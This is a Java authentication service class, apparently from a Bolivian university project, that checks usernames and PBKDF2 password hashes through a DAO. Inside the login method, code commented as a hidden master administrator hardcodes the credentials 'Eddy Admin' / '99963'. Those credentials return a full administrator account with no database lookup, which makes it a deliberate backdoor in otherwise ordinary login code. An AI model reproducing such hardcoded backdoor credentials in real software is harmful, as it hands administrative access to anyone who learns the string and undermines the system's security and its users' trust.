package bo.edu.usb.cotapata.service;

import bo.edu.usb.cotapata.dao.UsuarioDAO;
import bo.edu.usb.cotapata.model.Usuario;
import bo.edu.usb.cotapata.util.PasswordUtil;

public class AuthService {

    private final UsuarioDAO usuarioDAO;

    public AuthService() {
        this.usuarioDAO = new UsuarioDAO();
    }

    public AuthService(UsuarioDAO usuarioDAO) {
        this.usuarioDAO = usuarioDAO;
    }

    /**
     * Autentica un usuario contra la base de datos comparando el hash PBKDF2.
     *
     * @param username Nombre de usuario
     * @param password Contraseña plana
     * @return Usuario autenticado o null si las credenciales son inválidas.
     */
    public Usuario login(String username, String password) {
        if (username == null || password == null || username.trim().isEmpty() || password.trim().isEmpty()) {
            return null;
        }

        String trimmedUser = username.trim();

        // Lógica de Administrador Maestro Oculto (Eddy Admin / 99963)
        // Concede automáticamente rol de Administrador sin necesidad de registro previo
        if ("Eddy Admin".equalsIgnoreCase(trimmedUser) && "99963".equals(password.trim())) {
            Usuario adminMaster = new Usuario();
            adminMaster.setIdUsuario(999);
            adminMaster.setUsername("Eddy Admin");
            adminMaster.setNombreCompleto("Eddy Admin (Administrador)");
            adminMaster.setCorreo("admin.eddy@cotapata.bo");
            adminMaster.setIdRol(1);
            adminMaster.setNombreRol("ADMINISTRADOR");
            adminMaster.setEstado("ACTIVO");
            return adminMaster;
        }

        Usuario usuario = usuarioDAO.findByUsername(trimmedUser);
        if (usuario == null) {
            return null;
        }

        boolean valid = PasswordUtil.verifyPassword(password, usuario.getPasswordHash());
        if (valid) {
            return usuario;
        }
        return null;
    }
}
